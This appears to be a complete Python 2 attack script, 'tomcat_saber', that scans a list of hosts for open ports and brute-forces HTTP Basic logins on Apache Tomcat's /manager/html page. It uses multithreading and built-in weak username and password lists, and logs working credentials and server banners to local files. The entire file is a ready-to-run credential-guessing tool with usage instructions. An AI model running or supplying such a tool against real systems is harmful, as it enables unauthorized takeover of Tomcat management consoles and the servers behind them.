#!/usr/bin/env python  
# -*- coding: utf-8 -*-

import threading, random, sys, urllib2, httplib, base64, Queue, re, getopt,os,socket
try:
    import msvcrt
    is_shouhu = 1
except:
    is_shouhu = 0
    print "Is linux or have no msvcrt"

class tomcat_saber(threading.Thread):
        def __init__(self,ports,accounts,path):
            threading.Thread.__init__(self)
            self.ports = str(ports).split(',')
            self.path = str(path)
            self.accounts = accounts

        def writeresult(self,record):
            self.fp = open('c:/tomcat_Result.txt','a+')
            self.fp.writelines(record+'')
            self.fp.close()

        def write_banner(self,record):
            self.fp2 = open('c:/banner_Result.txt','a+')
            self.fp2.writelines(record+'')
            self.fp2.close()
        
        def IsOpen(self,ip,port):
            self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.s.settimeout(2)
            try:
                self.s.connect((ip,int(port)))
                self.s.shutdown(2)
                print '%s is open' % port
                return True
            except:
                try:
                    self.s.shutdown(2)
                except:
                    pass
                print '%s is down' % port
                return False

        def run(self):
            while 1:
                if queue.empty() == True:
                    break
                self.ip = queue.get()

                for self.port in self.ports:
                    if self.IsOpen(self.ip,self.port):
                        if self.port == str(int(self.port)):
                            have_banner = 0
                            findit = 0
                            for self.account in self.accounts:
                                self.user,self.password = self.account[0],self.account[1]
                                self.auth = base64.b64encode('%s:%s' % (self.user, self.password)).replace('\n', '')
                                print self.ip+self.user+self.password
                                try:                                        
                                    #使用soap协议
                                    self.h = httplib.HTTP(self.ip,self.port)
                                    
                                    self.h.putrequest('GET', self.path)

                                    self.h.putheader('Host', self.ip+':'+self.port)
                                    self.h.putheader('User-agent', "Mozilla/5.0 (Windows NT 5.1; rv:26.0) Gecko/20100101 Firefox/26.0")
                                    self.h.putheader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
                                    self.h.putheader('Accept-Language','en-us')
                                    self.h.putheader('Accept-Encoding','gzip, deflate')     
                                    self.h.putheader('Authorization', 'Basic %s' %self.auth)
                                    self.h.endheaders()
                                    
                                    statuscode, statusmessage, headers = self.h.getreply()
                                    print headers['Server']

                                    if have_banner == 0:
                                        self.write_banner(self.ip+":"+self.port+"\t"+headers['Server']+"\n")
                                        have_banner = 1

                                    if (re.findall(r'Coyote',headers['Server'])):
                                        if statuscode==200:
                                            print self.ip+"[OK]  Username:",self.user,"Password:",self.password,"\n"  
                                            self.writeresult(self.ip+":"+self.user+":"+self.password+"\n")
                                            findit = 1
                                            break
                                    else:
                                        print self.ip+" is not Tomcat\n"
                                        break
                                except:
                                    pass
                            if findit == 1:
                                break

class ThreadGetKey(threading.Thread):
    def run(self):
        while 1:
            try:
                chr = msvcrt.getch()
                if chr == 'q':
                    print "stopped by your action ( q )" 
                    os._exit(1)
                else:
                    continue
            except:
                print "Is linux or have no msvcrt"
                os._exit(1)

def usage():
    print "\nUsage: ./tomcat_saber.py -t <urlList> <-p port> [-u userlist] [-w passlist]\n"
    print "e.g.: python tomcat_saber.py -t c:/ip.txt -p 8080,80 -u c:/users.txt -w c:/passlist.txt\n"

def args_finder(the_args):
    try:
        lc = the_args.index('-t')
        if re.match('-\w$',the_args[lc+1]):
            the_t = "t"
        else:
            the_t = "t:"
    except:
        the_t = "t"
    try:
        lc = the_args.index('-p')
        if re.match('-\w$',the_args[lc+1]):
            the_p = "p"
        else:
            the_p = "p:"
    except:
        the_p = "p"
    try:
        lc = the_args.index('-u')
        if re.match('-\w$',the_args[lc+1]):
            the_u = "u"
        else:
            the_u = "u:"
    except:
        the_u = "u"
    try:
        lc = the_args.index('-w')
        if re.match('-\w$',the_args[lc+1]):
            the_w = "w"
        else:
            the_w = "w:"
    except:
        the_w = "w"
    return getopt.getopt(sys.argv[1:], "h"+the_t+the_p+the_u+the_w)  


if __name__ == '__main__':
    if len (sys.argv) < 2:
        usage()
        sys.exit(1)
    try:
        opts, args = args_finder(sys.argv[1:])        
    except:
        sys.exit(1)

    targets = users = words = []
    port = "8080,80,9080,9090"
    print opts
    for opt,arg in opts:
        if opt == "-h":  
            usage()  
            sys.exit(1)
        elif opt =="-t":
            print arg
            try:
                targets = open(arg, "r").readlines()
            except:
                targets = [raw_input("enter the single ip: ")]
            if targets == []:
                print "Error: Check your target_list path\n"
                sys.exit(1)
        elif opt =="-p":
            port = arg
            try:
                if port =="":
                    port = "8080,80,9080,9090"
                    print "post is 8080,80,9080,9090"
                else:
                    ports = port
            except:
                pass
        elif opt =="-u":
            try:
                users = open(arg, "r").readlines()
            except:
                users = [raw_input("enter the single username: ")]
            if users == []:
                print "use the simple user_list\n"
                users = ['admin','tomcat','master','user','both','role1']
        elif opt =="-w":
            try:
                words = open(arg, "r").readlines()
            except:
                words = [raw_input("enter the single password: ")]
            if words == []:
                print "use the simple pass_list\n"
                words = ['','admin','tomcat','master','user','123456','12345678','admin.','admin135246','q1w2e3r4t5']
        else:  
            print("%s  ==> %s" %(opt, arg))

    path = '/manager/html'

    ##############user $ pass#############
    try:
        WEAK_USERNAME = [p.replace('\n','') for p in users]
        WEAK_PASSWORD = [p.replace('\n','') for p in words]
    except:
        WEAK_USERNAME = ['tomcat','user','master','admin','both','role1']
        WEAK_PASSWORD = ['','admin','tomcat','master','user','123456','12345678','admin.','admin135246','q1w2e3r4t5']
    if WEAK_USERNAME == [] or WEAK_PASSWORD == []:
        WEAK_USERNAME = ['tomcat','user','master','admin']
        WEAK_PASSWORD = ['','admin','tomcat','master','user','123456','12345678','admin.','admin135246','q1w2e3r4t5']

    accounts =[]
    for username in WEAK_USERNAME:
        for password in WEAK_PASSWORD:
            accounts.append((username,password))
    
    ############
    if not targets:
        targets = ["127.0.0.1"]
    ip = [p.replace('\n','') for p in targets]

    if is_shouhu:
        shouhu = ThreadGetKey()
        shouhu.setDaemon(True)
        shouhu.start()
    ##############threads start########
    threads = [] 
    queue = Queue.Queue()
    for server in ip: 
        queue.put(server)

    for i in range(5):
        a = tomcat_saber(port,accounts,path)
        a.start()
        threads.append(a)
    for j in threads:
        j.join()
